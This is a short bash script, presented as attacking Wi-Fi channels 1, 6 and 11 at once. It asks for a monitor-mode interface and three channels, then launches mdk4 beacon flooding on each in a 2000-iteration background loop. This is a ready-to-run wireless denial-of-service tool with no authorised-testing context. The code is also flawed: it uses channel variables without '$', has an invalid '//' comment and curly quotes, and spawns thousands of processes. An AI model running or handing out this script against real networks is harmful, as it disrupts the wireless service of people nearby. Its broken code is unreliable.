This script simultaneously attacks channel 1,6,11


#! /bin/bash
read -p “Enter interface (monitor mode) you wise to use for the attack:” interface
read -p “Enter channel you wish to attack:” channel1
read -p “Enter channel you wish to attack:” channel2
read -p “Enter channel you wish to attack:” channel3
iwconfig $interface channel $channel1 // this is additional
for count in $(seq 1 2000)
do
(mdk4 $interface b -c channel1> /dev/null)&
(mdk4 $interface b -c channel2> /dev/null)&
(mdk4 $interface b -c channel3> /dev/null)&
done
